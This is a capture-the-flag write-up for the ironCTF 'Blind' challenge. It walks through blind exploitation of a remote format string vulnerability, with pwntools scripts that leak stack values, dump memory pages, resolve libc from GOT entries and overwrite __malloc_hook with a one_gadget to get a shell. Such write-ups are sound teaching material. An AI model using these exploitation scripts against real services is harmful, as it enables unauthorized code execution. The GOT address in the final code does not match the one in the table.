![[desc.png]]

In this challenge, we were not given a copy of the executable, hence the title "Blind," which means we will be doing blind binary exploitation.

After connecting to the service using `netcat`, we are greeted with the following prompt:
![[Screenshot_20241014_134904.png]]

Any input entered is echoed back as output:
![[Screenshot_20241014_134952.png]]

Since our input is being echoed back at us, I suspected the program might be vulnerable to a format string attack, and sure enough, that was the case. From the leaked value, it's also obvious that the binary is a 64-bit executable.
![[Screenshot_20241014_135054.png]]

This is good news because we can perform arbitrary reads and writes using this vulnerability. We can also leak the values in stack using this vulnerability, which could potentially give us more insight into the memory layout of the program.

To start, I wrote a Python script using `pwntools` to leak stack values and determine their respective offsets.
```python
def leak_stack(io, offset):
	payload = f"AA%{offset}$lpBB"
	send_input(io, payload)

	io.recvuntil(b'AA')
	leak = io.recvuntil(b'BB')[:-2].decode()
	
	log.info(f"Leaked at offset {offset}: {leak}")
	return leak

io = conn()

i = 1
while i < 256:
    try:
        leak_stack(io, i)
        i += 1
    except EOFError as e:
        io.close()
        io = conn()
```

Using this code, I discovered something interesting:
![[Screenshot_20241014_140043.png]]

The values leaked at offsets 155 and 157 seem to refer to code in executable memory. This also indicates that there is a memory page starting at `0x400000`, which suggests that the binary is not PIE (Position Independent Executable) because `0x400000` is a common base address for 64-bit non-PIE executables. To gather more information, I decided to leak the memory page, which is possible with the format string vulnerability.

Before proceeding, I wanted to check for other memory pages to make sure nothing was missed. I used the following code:
```python
 def read_at(io, address):
	payload = b'%7$s____'
	payload += p64(address)
	send_input(io, payload)

	leak = io.recvuntil(b'____')[:-4] + b'\x00'

	log.info(f"Leaked at {hex(address)}: {leak}")
	return leak


def check_segment(address):
	log.info(f"Checking segment: {hex(address)}")
	io = conn()
	try:
		read_at(io, address)
		io.close()
		log.success(f"Memory segment {hex(address)} exists!")
		return True
	except EOFError:
		io.close()
		log.warn(f"Memory segment {hex(address)} does not exist.")
		return False
```

And I got the following results:
![[Screenshot_20241014_141212.png]]

I then dumped all the contents of each memory page using the following code and used multithreading to dump multiple pages at the same time to speed up the process:
```python
def leak_segment(address, size, output_file):
	log.info(f"Leaking memory segment: {hex(address)}")
	cur_address = address
	end_address = address + size

	data = b''

	io = conn()
	while cur_address < end_address:
		try:
			chunk = read_at(io, cur_address)
			cur_address += len(chunk)
			data += chunk
		except EOFError:
			io.close()
			io = conn()

	with open(output_file, "wb") as FILE:
		FILE.write(data)

	log.success(f"Wrote memory segment, {hex(address)}, to {output_file}.")
	return data


MEMORY_SEGMENTS = [
	0x3fc000,
	0x3fe000,
	0x400000,
	0x600000,       
	0x601000,       
]

import concurrent.futures

def leak_segment_wrapper(segment):
	output_file = hex(segment) + ".dump"
	leak_segment(segment, 0x1000, output_file)

with concurrent.futures.ThreadPoolExecutor() as executor:
	futures = [executor.submit(leak_segment_wrapper, segment) for segment in MEMORY_SEGMENTS]

	for future in concurrent.futures.as_completed(futures):
		try:
			result = future.result()
		except Exception as e:
			print(f"An error occurred: {e}")
```

At this point, I have a copy of all the memory pages we discovered earlier:
![[Screenshot_20241014_141604.png]]

Now that we have a copy of the executable page, `0x400000.dump`, I analyzed it using Cutter, and sure enough, it contains the code for the main loop of the program:
![[Screenshot_20241014_143449.png]]

I suspected that this is the main loop because we can see the string of the prompt being used here at `0x004006ee`, and there is a `jmp` instruction at `0x00400751` at loops back to `0x00400713` without any checks or condition.

Using this, we can carefully analyze the program and basically "guess" which libc functions are being called here, and I came up with the following:
![[Screenshot_20241014_144024.png]]

We can then check which of the PLT entries these point to by looking at the address pointed to by the call function:
![[Screenshot_20241014_144209.png]]

This then gives us the address of the GOT entries for each of these functions, resulting to the following mapping:

| Function | PLT Entry  | GOT Entry  |
| -------- | ---------- | ---------- |
| `puts`   | `0x400550` | `0x600fc8` |
| `printf` | `0x400580` | `0x600fe0` |
| `read`   | `0x400580` | `0x600fe8` |
We can then use the dump we got from the page, `0x600000` - `0x601000`, to leak the libc addresses of these functions:
![[Screenshot_20241014_145210.png]]

| Function | PLT Entry  | GOT Entry  | libc Address     |
| -------- | ---------- | ---------- | ---------------- |
| `puts`   | `0x400550` | `0x600fc8` | `0x7fa10d1d5970` |
| `printf` | `0x400580` | `0x600fe0` | `0x7fa10d1b9e40` |
| `read`   | `0x400580` | `0x600fe8` | `0x7fa10d265020` |

Using these addresses, we can use a [libc database](https://libc.rip/) to finally determine the libc version that the binary is using:
![[Screenshot_20241014_145547.png]]

In my case, I decided to use the first result and it worked, but if it happened that it didn't work, I could easily just download the second one.

So at this point, we now know the libc version used by the binary as well as the address of the GOT entries. Now it's time for the final exploitation phase.

Since we have a format string vulnerability that alllows us to write any value to an arbitrary address, we essentially have what we call a [Write What Where 2 Exec](https://book.hacktricks.xyz/binary-exploitation/arbitrary-write-2-exec) or "WWW2Exec" in short. In my case, I used [Malloc Hook](https://book.hacktricks.xyz/binary-exploitation/arbitrary-write-2-exec/aw2exec-__malloc_hook) to get a shell since the libc version is pre-2.34, not to mention, the easiest. In short, for this attack, we have to overwrite the variable `__malloc_hook` found in libc with the address of a [One Gadget](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/one-gadget) 

So in summary, our final exploit will look like this:
1. Compute the libc address by leaking the GOT entry of any of the functions leaked above, in my case I used the GOT entry `printf()`
2. Compute the address of the `__malloc_hook` and the `one_gadget`
3. Perform a format string attack to write the address of the `one_gadget` at the address of the `__malloc_hook`
4. Send input, `%10000$c` to trigger malloc using printf.
5. Get the flag using the shell.

In my case, the final exploit code looked like this:
```python
io = conn()
PRINTF_FUNC = u64(read_at(io, 0x600fd0).ljust(8, b'\x00'))

libc.address = PRINTF_FUNC - libc.sym['printf']
	
log.success(f"Leaked libc address: {hex(libc.address)}")

MALLOC_HOOK = libc.sym["__malloc_hook"]
ONE_GADGET = libc.address + 0x10a2fc

writes = {
	MALLOC_HOOK: ONE_GADGET
}

payload = fmtstr_payload(6, writes)
send_input(io, payload)

send_input(io, "%10000$c")

io.interactive()
```

![[Screenshot_20241014_151836.png]]

Flag: `ironCTF{Haha_You_Found_me_b1ind}`
